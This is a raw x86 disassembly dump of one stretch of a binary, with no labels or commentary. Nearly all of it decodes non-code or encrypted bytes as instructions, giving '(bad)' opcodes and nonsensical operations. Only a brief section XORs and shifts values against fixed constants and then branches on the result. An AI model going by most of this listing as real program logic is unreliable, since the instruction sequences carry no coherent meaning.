  40e635:	arpl   WORD PTR [ebx+0x18cdcde4],sp
  40e63b:	or     DWORD PTR [ebx+0x9],ebp
  40e63e:	jbe    0x40e61d
  40e640:	adc    DWORD PTR [ecx],esp
  40e642:	adc    bh,BYTE PTR [ecx+0x5e9999b6]
  40e648:	test   eax,0xcb6a90bf
  40e64d:	es (bad) 
  40e650:	push   0x54
  40e652:	or     ecx,DWORD PTR [ecx+0x1c320ab4]
  40e658:	ins    BYTE PTR es:[edi],dx
  40e659:	mov    WORD PTR [edx+0x31],fs
  40e65c:	shl    DWORD PTR [ebx-0x201ebae7],cl
  40e662:	fst    QWORD PTR [edx-0x60]
  40e665:	fsub   DWORD PTR ds:0x9f86c30e
  40e66b:	xor    DWORD PTR [eax+0x45],eax
  40e66e:	test   BYTE PTR [edi+0x6201cd35],0xe1
  40e675:	neg    eax
  40e677:	mov    ebx,DWORD PTR [edx]
  40e679:	icebp  
  40e67a:	int    0xa5
  40e67c:	fucomip st,st(0)
  40e67e:	xor    BYTE PTR [edx+0xe],cl
  40e681:	sete   BYTE PTR [esi-0x2d01d241]
  40e688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e689:	fmul   st,st(6)
  40e68b:	cmp    al,BYTE PTR [ebx-0x70]
  40e68e:	xor    ah,BYTE PTR [edi-0x7a489e4e]
  40e694:	mov    ah,0x9d
  40e696:	(bad)  
  40e697:	into   
  40e698:	sub    eax,0xb66ef1fb
  40e69d:	aad    0xbf
  40e69f:	pop    ebx
  40e6a0:	and    bh,dh
  40e6a2:	das    
  40e6a3:	pop    ebp
  40e6a4:	xchg   edi,eax
  40e6a5:	data16 test al,0x20
  40e6a8:	mov    bh,0x78
  40e6aa:	clc    
  40e6ab:	mov    esi,0x7bd72974
  40e6b0:	mov    ebp,0x936fa9b3
  40e6b5:	ss nop
  40e6b7:	cmp    al,0xe6
  40e6b9:	shl    BYTE PTR ds:0x2b9ae575,1
  40e6bf:	sbb    al,0xd1
  40e6c1:	mov    dl,0x69
  40e6c3:	cmp    al,0xdd
  40e6c5:	das    
  40e6c6:	sub    eax,ebp
  40e6c8:	repz jecxz 0x40e68d
  40e6cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6cc:	adc    bl,BYTE PTR [ebp+0x5f]
  40e6cf:	fldcw  WORD PTR [ebp+0x4b]
  40e6d2:	pop    edi
  40e6d3:	xchg   edi,eax
  40e6d4:	mov    DWORD PTR [edx],eax
  40e6d6:	stos   DWORD PTR es:[edi],eax
  40e6d7:	inc    ebx
  40e6d8:	leave  
  40e6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6da:	jns    0x59638cc3
  40e6e0:	fdivr  st(1),st
  40e6e2:	push   ss
  40e6e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6e4:	leave  
  40e6e5:	mov    ecx,DWORD PTR [edi+0x3e]
  40e6e8:	jmp    DWORD PTR [esi-0xf706def]
  40e6ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6ef:	shr    BYTE PTR [edi-0x6b],cl
  40e6f2:	push   ebx
  40e6f3:	or     dl,bl
  40e6f5:	repz rcl BYTE PTR [ecx+eax*2+0x35c38346],1
  40e6fd:	pop    edi
  40e6fe:	mov    esp,ebp
  40e700:	imul   esi,DWORD PTR [ebx-0x28],0xffffff88
  40e704:	or     al,bh
  40e706:	fwait
  40e707:	xchg   DWORD PTR [ebp-0x2ef690e1],ebp
  40e70d:	mov    ah,0xed
  40e70f:	(bad)  [edx-0x23]
  40e712:	mov    dh,0x68
  40e714:	loope  0x40e76d
  40e716:	dec    edx
  40e717:	dec    ecx
  40e718:	test   eax,0xda43e3ab
  40e71d:	divps  xmm7,xmm1
  40e720:	scas   al,BYTE PTR es:[edi]
  40e721:	fwait
  40e722:	shl    ecx,0xad
  40e725:	cld    
  40e726:	cld    
  40e727:	neg    bl
  40e729:	cmp    eax,0x3d1fce34
  40e72e:	mov    esi,0xebd5f0a2
  40e733:	(bad)  
  40e735:	ficomp WORD PTR [edi]
  40e737:	out    dx,eax
  40e738:	jo     0x40e711
  40e73a:	sub    ah,BYTE PTR [esi-0x33]
  40e73d:	cmp    ebx,DWORD PTR [edx+0x7fbe0ffd]
  40e743:	loope  0x40e764
  40e745:	xor    eax,0xee1bff4e
  40e74a:	or     BYTE PTR [edi],bl
  40e74c:	les    edx,FWORD PTR [eax-0x61]
  40e74f:	(bad)  
  40e751:	dec    eax
  40e752:	call   0xdd05:0x90547644
  40e759:	mov    esp,0x3430cda9
  40e75e:	(bad)  
  40e75f:	jo     0x40e6f3
  40e761:	mov    ds:0x189a155b,al
  40e766:	test   eax,0xfc231da
  40e76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e76c:	mov    bh,0x17
  40e76e:	jb     0x40e7da
  40e770:	cli    
  40e771:	stos   DWORD PTR es:[edi],eax
  40e772:	push   esp
  40e773:	enter  0x568a,0x88
  40e777:	mov    DWORD PTR [ebp+0x71],edx
  40e77a:	iret   
  40e77b:	pop    ecx
  40e77c:	xchg   edi,eax
  40e77d:	or     eax,0x6d978de5
  40e782:	push   es
  40e783:	mov    bl,0x5c
  40e785:	mov    WORD PTR [ecx+0x5c545fad],ss
  40e78b:	lods   al,BYTE PTR ds:[esi]
  40e78c:	mov    bh,BYTE PTR [edi]
  40e78e:	xchg   ebx,eax
  40e78f:	scas   al,BYTE PTR es:[edi]
  40e790:	pop    esi
  40e791:	adc    al,0x30
  40e793:	pushf  
  40e794:	sbb    al,ah
  40e796:	sti    
  40e797:	dec    edx
  40e798:	aaa    
  40e799:	and    BYTE PTR ds:0xe00bee50,0xc1
  40e7a0:	cli    
  40e7a1:	cmp    eax,0x2a49a5c2
  40e7a6:	sub    BYTE PTR [ebp+0x42],0x67
  40e7aa:	and    BYTE PTR [ebx-0x3f60cb4],al
  40e7b0:	in     eax,0x4f
  40e7b2:	into   
  40e7b3:	dec    esi
  40e7b4:	jmp    0x40e7bc
  40e7b6:	cmp    DWORD PTR [ecx+0x157aab50],esp
  40e7bc:	xor    eax,0x2bb9a797
  40e7c1:	and    eax,DWORD PTR [edi+0x6]
  40e7c4:	lea    esp,[edi-0x8fa5b17]
  40e7ca:	xchg   ecx,eax
  40e7cb:	cwde   
  40e7cc:	add    edi,DWORD PTR [esi+ebx*2+0x5]
  40e7d0:	fucom  st(2)
  40e7d2:	xor    esi,DWORD PTR [edi]
  40e7d4:	pop    esi
  40e7d5:	or     DWORD PTR [ecx],0x1c
  40e7d8:	inc    ebx
  40e7d9:	cli    
  40e7da:	test   al,0x28
  40e7dc:	clc    
  40e7dd:	pop    esp
  40e7de:	(bad)  
  40e7df:	mov    ds:0x7f58696f,al
  40e7e4:	sbb    al,0x1b
  40e7e6:	mov    dl,0x1c
  40e7e8:	cdq    
  40e7e9:	mov    ds:0x560742c3,al
  40e7ee:	inc    ebx
  40e7ef:	xchg   ebx,eax
  40e7f0:	pop    ds
  40e7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7f2:	inc    edi
  40e7f3:	test   eax,0xaf79425e
  40e7f8:	mov    ?,WORD PTR ds:0xdcef9fc6
  40e7fe:	inc    ebx
  40e7ff:	and    BYTE PTR [ebp+0x5151b1c2],dl
  40e805:	mov    ds:0x966d4cb2,eax
  40e80a:	leave  
  40e80b:	adc    BYTE PTR [esi],0xb2
  40e80e:	fisttp DWORD PTR [edx-0x3f7229cc]
  40e814:	test   DWORD PTR [ebx],0x90cdb84b
  40e81a:	sahf   
  40e81b:	hlt    
  40e81c:	mov    ecx,0x386f1736
  40e821:	push   0x58
  40e823:	shl    BYTE PTR [edi+0x48fbdf39],1
  40e829:	sub    ch,BYTE PTR [ebp+0x3985121e]
  40e82f:	xchg   edx,eax
  40e830:	xor    BYTE PTR [edx*1-0xe16683b],dh
  40e837:	jns    0x40e814
  40e839:	xchg   ebx,eax
  40e83a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e83b:	xchg   ebp,edx
  40e83d:	stos   DWORD PTR es:[edi],eax
  40e83e:	stc    
  40e83f:	fcom   DWORD PTR [edi-0x47305fc]
  40e845:	fstp   QWORD PTR ds:0x47d86f31
  40e84b:	fwait
  40e84c:	or     BYTE PTR [ebx+0x4b],ah
  40e84f:	rcr    edx,0x34
  40e852:	sahf   
  40e853:	sub    al,0xcd
  40e855:	aaa    
  40e856:	lock cmp ebx,DWORD PTR [ebx+0x684343d0]
  40e85d:	test   DWORD PTR [edx-0x3c],esp
  40e860:	call   DWORD PTR [eax]
  40e862:	jno    0x40e85e
  40e864:	jnp    0x40e7f7
  40e866:	stos   BYTE PTR es:[edi],al
  40e867:	std    
  40e868:	(bad)  
  40e869:	pop    eax
  40e86a:	xor    ebp,ebx
  40e86c:	lock gs sub ecx,edx
  40e870:	jle    0x40e801
  40e872:	and    al,0x31
  40e874:	(bad)  
  40e875:	aad    0x68
  40e877:	sub    al,0x8e
  40e879:	add    al,0x10
  40e87b:	dec    esi
  40e87c:	pop    edx
  40e87d:	ss loop 0x40e880
  40e880:	lock xchg ecx,eax
  40e882:	repnz sub edx,edi
  40e885:	stos   DWORD PTR es:[edi],eax
  40e886:	in     eax,dx
  40e887:	stc    
  40e888:	daa    
  40e889:	in     al,0xc2
  40e88b:	push   ebp
  40e88c:	ds mov dh,0x7b
  40e88f:	out    0x60,al
  40e891:	cmp    edi,DWORD PTR [esi-0xbbc84aa]
  40e897:	test   DWORD PTR [ecx-0x76],0x86275940
  40e89e:	jne    0x40e918
  40e8a0:	cli    
  40e8a1:	pop    eax
  40e8a2:	sbb    esp,DWORD PTR [esi-0x53]
  40e8a5:	and    dl,BYTE PTR [esi]
  40e8a7:	cwde   
  40e8a8:	or     DWORD PTR [ecx+0x3c],0x3f
  40e8ac:	arpl   WORD PTR [edi],si
  40e8ae:	loop   0x40e88d
  40e8b0:	inc    esp
  40e8b1:	adc    DWORD PTR [ecx+0x59581944],esi
  40e8b7:	xchg   edx,eax
  40e8b8:	jl     0x40e8d6
  40e8ba:	mov    ds:0xf178da73,al
  40e8bf:	scas   al,BYTE PTR es:[edi]
  40e8c0:	mul    BYTE PTR ds:0x654fde50
  40e8c6:	add    ebp,DWORD PTR [ebx+ebx*2]
  40e8c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8ca:	aaa    
  40e8cb:	aam    0xf5
  40e8cd:	jo     0x40e929
  40e8cf:	mov    esp,0x5aa5b2c6
  40e8d4:	repnz sar BYTE PTR [edx],0x64
  40e8d8:	push   0x5b12d314
  40e8dd:	dec    ebx
  40e8de:	sbb    eax,0xabf9dc33
  40e8e3:	jmp    0x40e8b6
  40e8e5:	cmp    esp,0x9d5955fe
  40e8eb:	xchg   esp,eax
  40e8ec:	push   ds
  40e8ed:	clc    
  40e8ee:	call   0x8689:0x2b09c110
  40e8f5:	test   DWORD PTR [edi+edx*4-0x387ed6f7],edi
  40e8fc:	jb     0x40e890
  40e8fe:	jmp    0xdea8:0x61539b51
  40e905:	out    0x80,eax
  40e907:	add    edi,ebx
  40e909:	cmp    eax,0x8c8f3d22
  40e90e:	mov    BYTE PTR [edi+ebp*8+0x1e3a2a87],dl
  40e915:	mov    cl,0x46
  40e917:	sbb    eax,0x10dbac9c
  40e91c:	in     eax,0x61
  40e91e:	sar    DWORD PTR [edx+ebp*4+0x1ce5aaf5],1
  40e925:	xchg   esp,eax
  40e926:	or     esp,eax
  40e928:	or     esi,DWORD PTR [ecx-0x2c]
  40e92b:	xor    DWORD PTR [ecx-0x36],0x808b4b50
  40e932:	adc    ebp,0x1
  40e935:	push   es
  40e936:	xor    ah,ah
  40e938:	jnp    0x40e90e
  40e93a:	(bad)  
  40e93b:	mov    ch,0x2c
  40e93d:	and    DWORD PTR ds:0xe84271d0,0x9474cdb0
  40e947:	jmp    ebp
  40e949:	dec    ebp
  40e94a:	mov    bh,0x5
  40e94c:	adc    esp,eax
  40e94e:	xchg   edi,eax
  40e94f:	fld    QWORD PTR [ecx-0x3f79f339]
  40e955:	cmp    al,0xd2
  40e957:	aaa    
  40e958:	add    eax,0x2967472e
  40e95d:	call   0x58fd3562
  40e962:	test   BYTE PTR [eax],dh
  40e964:	mov    eax,ds:0xa19d9ee
  40e969:	push   eax
  40e96a:	push   ss
  40e96b:	and    DWORD PTR [edx],ebx
  40e96d:	inc    esp
  40e96e:	iret   
  40e96f:	call   0x4155c889
  40e974:	pop    edi
  40e975:	outs   dx,BYTE PTR ds:[esi]
  40e976:	nop
  40e977:	mov    ?,WORD PTR [ecx]
  40e979:	sbb    ecx,DWORD PTR [esi]
  40e97b:	pop    ecx
  40e97c:	and    al,0xfc
  40e97e:	xchg   esi,eax
  40e97f:	jle    0x40e9ab
  40e981:	je     0x40e9e8
  40e983:	jae    0x40e90f
  40e985:	and    BYTE PTR [esi-0x692d40b6],0x51
  40e98c:	pop    ebp
  40e98d:	mov    ah,0xea
  40e98f:	dec    ecx
  40e990:	in     al,dx
  40e991:	push   ebp
  40e992:	lea    ebp,ds:[esp+edi*4+0x4e3d1eb9]
  40e99a:	lds    edi,FWORD PTR [esi-0x45]
  40e99d:	pop    es
  40e99e:	js     0x40e952
  40e9a0:	sar    ebp,0xe9
  40e9a3:	xor    DWORD PTR [edi],0x3965db6d
  40e9a9:	cmp    eax,0x49ffc7b
  40e9ae:	loope  0x40e93d
  40e9b0:	jo     0x40e963
  40e9b2:	imul   edi,esp,0xa1d3962d
  40e9b8:	call   FWORD PTR [esi]
  40e9ba:	(bad)  
  40e9bb:	fs pop edx
  40e9bd:	sbb    DWORD PTR [eax+esi*1],esi
  40e9c0:	and    dh,al
  40e9c2:	xchg   esp,eax
  40e9c3:	mov    eax,ds:0x8ae3b75b
  40e9c8:	dec    edi
  40e9c9:	out    0xf8,al
  40e9cb:	mov    esi,0xad12ba66
  40e9d0:	frstor [eax+0x53]
  40e9d3:	call   0xa27febac
  40e9d8:	pop    ecx
  40e9d9:	cmovp  eax,DWORD PTR [esi-0x50a8290c]
  40e9e0:	sub    DWORD PTR [edi-0x59],esi
  40e9e3:	dec    ebp
  40e9e4:	test   ebx,ebx
  40e9e6:	call   0xcf68abb8
  40e9eb:	dec    eax
  40e9ec:	pop    edx
  40e9ed:	cmp    cl,BYTE PTR [edi+0x2e]
  40e9f0:	sbb    DWORD PTR [edx+0x61fe4142],ebp
  40e9f6:	lods   al,BYTE PTR ds:[esi]
  40e9f7:	sbb    ecx,DWORD PTR ss:[edi-0x20]
  40e9fb:	pusha  
  40e9fc:	in     eax,dx
  40e9fd:	scas   eax,DWORD PTR es:[edi]
  40e9fe:	adc    eax,0xc86a75cb
  40ea03:	fucomp st(2)
  40ea05:	xor    al,0x2f
  40ea07:	dec    ebx
  40ea08:	pop    es
  40ea09:	and    ebp,DWORD PTR [edi+0x2916bd69]
  40ea0f:	and    BYTE PTR [ebx+ebx*2],cl
  40ea12:	and    ch,BYTE PTR [edi+0x56472b43]
  40ea18:	into   
  40ea19:	jp     0x40ea72
  40ea1b:	cld    
  40ea1c:	and    BYTE PTR [edi],0x20
  40ea1f:	adc    eax,0x8b2f64c8
  40ea24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea25:	push   eax
  40ea26:	add    eax,0xc556ed06
  40ea2b:	ret    
  40ea2c:	lea    edi,[ecx+0x76ed4aeb]
  40ea32:	adc    DWORD PTR [eax],esp
  40ea34:	rol    esi,0x12
  40ea37:	fist   DWORD PTR [ebp-0x5498e85]
  40ea3d:	or     bl,0x80
  40ea40:	push   esp
  40ea41:	push   es
  40ea42:	test   eax,0x63bb1e12
  40ea47:	pop    esp
  40ea48:	mov    cl,0x68
  40ea4a:	enter  0xee4e,0x62
  40ea4e:	or     ah,BYTE PTR es:0xb59fa5e6
  40ea55:	jg     0x40ea59
  40ea57:	push   es
  40ea58:	shr    DWORD PTR [edi*1-0x491d4074],0xce
  40ea60:	aaa    
  40ea61:	jle    0x40ea8b
  40ea63:	cmp    eax,0x3349e021
  40ea68:	sub    DWORD PTR [edi],ecx
  40ea6a:	and    eax,0x656b236
  40ea6f:	clc    
  40ea70:	lds    esp,FWORD PTR [ecx+esi*2]
  40ea73:	fdiv   DWORD PTR [ebp-0x51e9d2dc]
  40ea79:	add    edx,DWORD PTR [edx-0x2ff7ad15]
  40ea7f:	popf   
  40ea80:	mov    ds:0x525baf09,al
  40ea85:	push   cs
  40ea86:	js     0x40ea17
  40ea88:	sub    al,ch
  40ea8a:	adc    al,0xb7
  40ea8c:	xlat   BYTE PTR cs:[ebx]
  40ea8e:	add    eax,0xcd902062
  40ea93:	call   0x880f:0x904837b0
  40ea9a:	(bad)  
  40ea9b:	mov    esi,0x9e78aecd
  40eaa0:	mov    ah,0xb2
  40eaa2:	sbb    al,0x16
  40eaa5:	xor    al,0x9
  40eaa7:	pusha  
  40eaa8:	fsubr  DWORD PTR [ecx]
  40eaaa:	cmp    bh,ch
  40eaac:	push   0x2436ffc2
  40eab1:	jg     0x40eaec
  40eab3:	out    0xbc,eax
  40eab5:	scas   eax,DWORD PTR es:[edi]
  40eab6:	mov    esp,0x5a69e75a
  40eabb:	inc    esp
  40eabc:	or     BYTE PTR [edx-0xd],0xfa
  40eac0:	jp     0x40ea64
  40eac2:	aad    0xb
  40eac4:	xchg   ebx,eax
  40eac5:	out    dx,eax
  40eac6:	cmc    
  40eac7:	pop    ss
  40eac8:	jmp    0x37e5f085
  40eacd:	addr16 jle 0x40eb17
  40ead0:	inc    edi
  40ead1:	mov    ah,BYTE PTR [esi+0x7d342840]
  40ead7:	ds nop
  40ead9:	fs adc ebx,0x36852b68
  40eae0:	xchg   edi,eax
  40eae1:	jmp    0x40eb0d
  40eae3:	mov    bl,0x2d
  40eae5:	mov    ah,0x8b
  40eae7:	push   edx
  40eae8:	sbb    al,0x3
  40eaea:	add    al,0x4b
  40eaec:	fnstenv [ebp-0x53]
  40eaef:	adc    al,0x68
  40eaf1:	dec    eax
  40eaf2:	aas    
  40eaf3:	shl    al,cl
  40eaf5:	mov    ds:0x46a292a6,eax
  40eafa:	push   0x54c90103
  40eaff:	fs out 0xdd,al
  40eb02:	jae    0x40eaed
  40eb04:	shl    BYTE PTR [eax],0xbd
  40eb07:	sbb    BYTE PTR [edx+0x4],0xdd
  40eb0b:	dec    eax
  40eb0c:	(bad)  
  40eb0d:	mov    eax,DWORD PTR [ebx]
  40eb0f:	mov    DWORD PTR [ebp-0x2c],edx
  40eb12:	mov    edx,DWORD PTR [ebx+0x4]
  40eb15:	mov    edx,eax
  40eb17:	xor    eax,eax
  40eb19:	shl    edx,0x1e
  40eb1c:	xor    edx,0xc0000000
  40eb22:	mov    DWORD PTR [ebp-0x70],eax
  40eb25:	mov    eax,DWORD PTR [ebx]
  40eb27:	mov    DWORD PTR [ebp-0x6c],edx
  40eb2a:	mov    edx,DWORD PTR [ebx+0x4]
  40eb2d:	xor    eax,0xba699573
  40eb32:	xor    edx,0x9c0a89d8
  40eb38:	shrd   eax,edx,0x2
  40eb3c:	or     eax,DWORD PTR [ebp-0x70]
  40eb3f:	shr    edx,0x2
  40eb42:	mov    DWORD PTR [ebp-0x38],eax
  40eb45:	mov    eax,edx
  40eb47:	or     eax,DWORD PTR [ebp-0x6c]
  40eb4a:	mov    DWORD PTR [ebp-0x5c],edx
  40eb4d:	cmp    ecx,DWORD PTR [ebp-0x38]
  40eb50:	jne    0x40da02
  40eb56:	cmp    DWORD PTR [ebp-0x2c],eax
  40eb59:	je     0x41a17f
  40eb5f:	jmp    0x40da02
  40eb64:	mov    eax,DWORD PTR [esi]
  40eb66:	mov    ecx,DWORD PTR [esi+0x4]
  40eb69:	mov    ecx,eax
  40eb6b:	shl    ecx,0x1e
  40eb6e:	xor    ecx,0xc0000000
  40eb74:	mov    DWORD PTR [ebp+0x14],ecx
  40eb77:	mov    ecx,DWORD PTR [esi]
  40eb79:	mov    edx,DWORD PTR [esi+0x4]
  40eb7c:	xor    ecx,0xba699573
  40eb82:	xor    edx,0x9c0a89d8
  40eb88:	shrd   ecx,edx,0x2
  40eb8c:	xor    eax,eax
  40eb8e:	or     ecx,eax
  40eb90:	mov    eax,DWORD PTR [ebx]
  40eb92:	mov    DWORD PTR [ebp-0x68],ecx
  40eb95:	mov    ecx,DWORD PTR [ebx+0x4]
  40eb98:	jmp    0x40f122
  40eb9d:	and    eax,0x9542a757
  40eba2:	adc    bl,BYTE PTR [eax]
  40eba4:	xor    BYTE PTR [eax],bl
  40eba6:	mov    al,ds:0xa054a805
  40ebab:	xchg   esp,eax
  40ebac:	mov    dl,0x8e
  40ebae:	mov    dl,BYTE PTR [esi]
  40ebb0:	push   ss
  40ebb1:	cmp    eax,0x40161604
  40ebb6:	sub    eax,0xf5a6ddf6
  40ebbb:	xor    al,dl
  40ebbd:	retf   0xac78
  40ebc0:	pcmpeqd mm6,QWORD PTR [edi+0x2b]
  40ebc4:	call   0x15e:0xaaebf33f
  40ebcb:	sbb    bh,BYTE PTR [eax]
  40ebcd:	leave  
  40ebce:	mov    es,WORD PTR [ebx+0x2faddfb7]
  40ebd4:	and    eax,0x84160988
  40ebd9:	and    edx,DWORD PTR [esi-0x6defe41]
  40ebdf:	jnp    0x40ebd2
  40ebe1:	push   ss
  40ebe2:	push   edx
  40ebe3:	lods   al,BYTE PTR ds:[esi]
  40ebe4:	lea    eax,[ecx+0x12]
  40ebe7:	ins    BYTE PTR es:[edi],dx
  40ebe8:	std    
  40ebe9:	ret    0x2b50
  40ebec:	addr16 (bad) 
  40ebee:	sub    bh,BYTE PTR [eax-0x40e625b5]
  40ebf4:	jns    0x40ec2e
  40ebf6:	lods   al,BYTE PTR ds:[esi]
  40ebf7:	xor    DWORD PTR [ebx],0x5
  40ebfa:	xchg   ebp,eax
  40ebfb:	shl    BYTE PTR [eax],1
  40ebfd:	loop   0x40eb85
  40ebff:	push   eax
  40ec00:	int3   
  40ec01:	pop    ss
  40ec02:	clc    
  40ec03:	cmp    bl,BYTE PTR [ecx-0xa]
  40ec06:	jno    0x40eb96
  40ec08:	dec    ecx
  40ec09:	lea    ebp,[esi]
  40ec0b:	js     0x40ebc2
  40ec0d:	test   eax,0xed9f906e
  40ec12:	push   ebx
  40ec13:	xchg   edi,eax
  40ec14:	(bad)  
  40ec15:	cmp    eax,0x7a56bf1c
  40ec1a:	stos   BYTE PTR es:[edi],al
  40ec1b:	jge    0x40ec27
  40ec1d:	or     DWORD PTR [edi],ebx
  40ec1f:	dec    ebx
  40ec20:	add    eax,0x8c2994fc
  40ec25:	jnp    0x40ec82
  40ec27:	in     eax,0xfa
  40ec29:	mov    ds:0x3a25906b,al
  40ec2e:	push   ebp
  40ec2f:	add    eax,0x91ae9ee2
  40ec34:	jns    0x40ec99
  40ec36:	push   ss
  40ec37:	sbb    eax,0x84f97213
  40ec3c:	or     BYTE PTR [ebx-0x2597d778],ah
  40ec42:	push   ss
  40ec43:	ret    0xb73d
  40ec46:	pop    esi
  40ec47:	dec    ebx
  40ec48:	jmp    0xc3b2670b
  40ec4d:	jb     0x40ec16
  40ec4f:	mov    WORD PTR [ecx+0x5],fs
  40ec52:	fdivr  QWORD PTR [edx+0x429cb0c]
  40ec58:	sub    eax,0x9a2e4b0b
  40ec5d:	arpl   WORD PTR gs:[esi-0x38cc5bf0],cx
  40ec64:	push   edx
  40ec65:	pop    ds
  40ec66:	in     eax,dx
  40ec67:	iret   
  40ec68:	adc    esi,DWORD PTR ds:0xcced0e11
  40ec6e:	cdq    
  40ec6f:	cmp    eax,0x58f49334
  40ec74:	jns    0x40ec39
  40ec76:	es mov al,0xa2
  40ec79:	push   0xf89d5431
  40ec7e:	pop    edi
  40ec7f:	cs jmp 0x40ed00
  40ec82:	das    
  40ec83:	or     ah,BYTE PTR [ecx]
  40ec85:	xor    BYTE PTR [edi-0xd638099],ah
  40ec8b:	je     0x40ec93
  40ec8d:	mov    esi,0x98b6c7a5
  40ec92:	xchg   ecx,eax
  40ec93:	data16 and dl,ch
  40ec96:	dec    edi
  40ec97:	icebp  
  40ec98:	stos   DWORD PTR es:[di],eax
  40ec9a:	(bad)  
  40ec9b:	ins    DWORD PTR es:[edi],dx
  40ec9c:	adc    eax,0x61a7f434
  40eca1:	adc    eax,0x8919d9ba
  40eca6:	and    DWORD PTR [eax],ebx
  40eca8:	xor    ch,BYTE PTR [ebx-0x5a]
  40ecab:	shl    DWORD PTR [edx-0x6c],cl
  40ecae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecaf:	add    al,0x78
  40ecb2:	outs   dx,DWORD PTR ds:[esi]
  40ecb3:	xchg   ebx,eax
  40ecb4:	adc    DWORD PTR [edi+eax*4+0x63],esp
  40ecb8:	inc    eax
  40ecb9:	sbb    bl,BYTE PTR [ecx-0x4b89a160]
  40ecbf:	dec    ecx
  40ecc0:	lods   eax,DWORD PTR ds:[esi]
  40ecc1:	es jb  0x40ed2e
  40ecc4:	stos   DWORD PTR es:[edi],eax
  40ecc5:	mov    al,ds:0xa97026cd
  40ecca:	test   ah,al
  40eccc:	mov    edi,0x192d4b3
  40ecd1:	int    0xd7
  40ecd3:	stc    
  40ecd4:	enter  0x4a28,0x92
  40ecd8:	(bad)  
  40ecd9:	cli    
  40ecda:	lds    edx,FWORD PTR [edx]
  40ecdc:	out    dx,eax
  40ecdd:	pop    eax
  40ecde:	test   ch,0x54
  40ece1:	mov    ebp,0x64a8048b
  40ece6:	push   ss
  40ece7:	ja     0x40ecf3
  40ece9:	inc    eax
  40ecea:	mov    BYTE PTR [edi+0x45],ah
  40eced:	push   0x3305d6eb
  40ecf2:	mov    ah,0xaa
  40ecf4:	scas   al,BYTE PTR es:[edi]
  40ecf5:	imul   edx,DWORD PTR [eax],0x75
  40ecf8:	ror    BYTE PTR [esi+0x5cc131d7],1
  40ecfe:	aam    0xa0
  40ed00:	ins    DWORD PTR es:[edi],dx
  40ed01:	xor    eax,0xb38447b4
  40ed06:	mov    dl,0x84
  40ed08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed09:	mov    ecx,0x117740f3
  40ed0e:	scas   eax,DWORD PTR es:[edi]
  40ed0f:	ds jno 0x40ec97
  40ed12:	popa   
  40ed13:	pusha  
  40ed14:	add    al,0x40
  40ed16:	(bad)  
  40ed17:	mov    ecx,0x6f6b4de8
  40ed1c:	mov    ebx,0x8eeecb37
  40ed21:	test   DWORD PTR [edx+0x3edf3b59],edi
  40ed27:	jo     0x40ed59
  40ed29:	xchg   ebp,eax
  40ed2a:	pop    ebp
  40ed2b:	sbb    al,BYTE PTR [ebp+0x35]
  40ed2e:	fisubr DWORD PTR [ecx+0x5e45ff29]
  40ed34:	sbb    eax,0x118a5e03
  40ed39:	xchg   ebx,eax
  40ed3a:	jp     0x40ecec
  40ed3c:	mov    al,0xa3
  40ed3e:	adc    al,0xa4
  40ed40:	sub    al,0xf4
  40ed42:	ins    DWORD PTR es:[edi],dx
  40ed43:	mov    esi,0x5b0d990e
  40ed48:	xor    ebp,ecx
  40ed4a:	dec    eax
  40ed4b:	mov    ch,0x83
  40ed4d:	pusha  
  40ed4e:	mov    WORD PTR [edx-0x27b1b68],cs
  40ed54:	pop    eax
  40ed55:	stos   BYTE PTR es:[edi],al
  40ed56:	xchg   esp,eax
  40ed57:	inc    eax
  40ed58:	add    DWORD PTR [edi+0x3a],ecx
  40ed5b:	stc    
  40ed5c:	adc    edi,DWORD PTR [edi+eiz*4+0x7]
  40ed60:	jge    0x40ed37
  40ed62:	ss pop ds
  40ed64:	adc    DWORD PTR [esi+0x144a3578],edx
  40ed6a:	push   0xffffffd8
  40ed6c:	jns    0x40ed61
  40ed6e:	xor    esi,DWORD PTR [ebp-0x3f]
  40ed71:	stc    
  40ed72:	out    dx,al
  40ed73:	push   edx
  40ed74:	mov    BYTE PTR [eax-0x340b907e],dl
  40ed7a:	xor    eax,esi
  40ed7c:	dec    ecx
  40ed7d:	mov    dl,0x2e
  40ed7f:	aas    
  40ed80:	cmp    dh,BYTE PTR [esp+esi*1-0x65]
  40ed84:	enter  0x28eb,0x81
  40ed88:	sbb    BYTE PTR [edi-0x35],cl
  40ed8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed8c:	aas    
  40ed8d:	dec    BYTE PTR [edi]
  40ed8f:	add    DWORD PTR [esi-0x31889b44],esi
  40ed95:	and    dh,cl
  40ed97:	shr    BYTE PTR [ebx+0x44],1
  40ed9a:	jns    0x40ed30
  40ed9c:	ins    BYTE PTR es:[edi],dx
  40ed9d:	sub    al,0xdc
  40ed9f:	pop    ecx
  40eda0:	xor    BYTE PTR [ebx],0x89
  40eda3:	mov    bh,BYTE PTR [esi-0x6699605c]
  40eda9:	(bad)  
  40edaa:	push   eax
  40edab:	les    ebx,FWORD PTR [edi+eiz*4-0x20]
  40edaf:	(bad)  ds:0x337f2504
  40edb5:	sub    al,0x34
  40edb7:	xchg   DWORD PTR [ebx-0x123a9630],esp
  40edbd:	shr    DWORD PTR [edi-0x1],0x8
  40edc1:	pop    ecx
  40edc2:	xchg   esp,eax
  40edc3:	cmp    bh,dh
  40edc5:	adc    eax,0xd27849ea
  40edca:	inc    ebx
  40edcb:	inc    edx
  40edcc:	mov    dl,0xd9
  40edce:	push   edi
  40edcf:	push   edi
  40edd0:	jle    0x40ee44
  40edd2:	dec    ebx
  40edd3:	stc    
  40edd4:	add    BYTE PTR ss:[ebp-0x7],bh
  40edd8:	ja     0x40edb4
  40edda:	xchg   BYTE PTR [ecx],cl
  40eddc:	lock mov ch,0xef
  40eddf:	and    BYTE PTR [edi-0x67],cl
  40ede2:	pushf  
